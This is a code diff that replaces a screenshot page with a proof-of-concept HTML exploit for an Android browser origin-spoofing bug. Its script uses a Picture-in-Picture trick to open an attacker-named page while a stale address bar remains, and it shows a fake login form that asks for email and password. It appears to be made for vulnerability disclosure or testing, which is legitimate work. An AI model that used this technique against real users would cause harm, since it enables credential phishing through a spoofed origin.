@@ -1,28 +1,118 @@
-<!DOCTYPE html> 
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Full Page Screenshot</title>
-    <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            overflow: hidden; /* Prevent scrolling or overflow */
-        }
 
-        img.fullscreen {
-            height: 100vh;
-            width: 100vw;
-            object-fit: cover;
-            display: block;
-        }
-    </style>
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+html { font-family: sans-serif; }
+
+body {
+    overscroll-behavior: contain;
+}
+
+#instructions {
+    text-align: center;
+    margin-top: 200px;
+    font-size: 2em;
+    user-select: none;
+}
+
+#canvasElem { display:none; }
+
+.hide { display:none; }
+</style>
 </head>
+
 <body>
-    <img class="fullscreen" src="screenshot.jpg" alt="Dog Screenshot">
+
+<div id="startContent">
+<h1>PoC: Android origin spoof due to stale address bar</h1>
+<p id="instructions">Tap once to start</p>
+</div>
+
+<div id="spoofContent" class="hide">
+<h1>Spoooo👻oooof</h1>
+<p><b>(ooh, scary!)</b></p>
+
+<h2>You must login to continue</h2>
+
+<form action="/?form" method="get">
+<input id="inputElem" name="email" placeholder="Email">
+<br>
+<input name="password" placeholder="Password" type="password">
+<input type="submit">
+</form>
+
+<a href="/?forgotpassword">Forgot password?</a>
+</div>
+
+<canvas id="canvasElem"></canvas>
+
+<script>
+
+var spoofUrl =
+'https://you-can-billowy-nimble-login-secure-docs-google-source-attacker.com/spoofkeyboard1.html';
+
+var targetWidth = 1000;
+var targetHeight = 500;
+
+var canvasElem = document.getElementById("canvasElem");
+
+function drawCanvas(text) {
+
+    const ctx = canvasElem.getContext('2d');
+
+    canvasElem.width = targetWidth;
+    canvasElem.height = targetHeight;
+
+    ctx.fillStyle = "#fff";
+    ctx.fillRect(0,0,targetWidth,targetHeight);
+
+    ctx.fillStyle = "#000";
+    ctx.font = "170px sans-serif";
+
+    ctx.fillText(text,50,targetHeight/2);
+}
+
+function createVideo(canvas) {
+
+    const video = document.createElement("video");
+
+    video.muted = true;
+
+    video.srcObject = canvas.captureStream();
+
+    video.play();
+
+    return video;
+}
+
+drawCanvas("");
+
+// create video for PiP
+var videoElem = createVideo(canvasElem);
+
+var ran = false;
+
+window.addEventListener("click", async () => {
+
+    if (ran) return;
+
+    ran = true;
+
+    try {
+
+        // Trigger PiP
+        await videoElem.requestPictureInPicture();
+
+    } catch(e) {}
+
+    // Open attacker window in same gesture
+    window.open(spoofUrl, "ao_spoof_test");
+
+});
+
+</script>
+
 </body>
 </html>
-
-
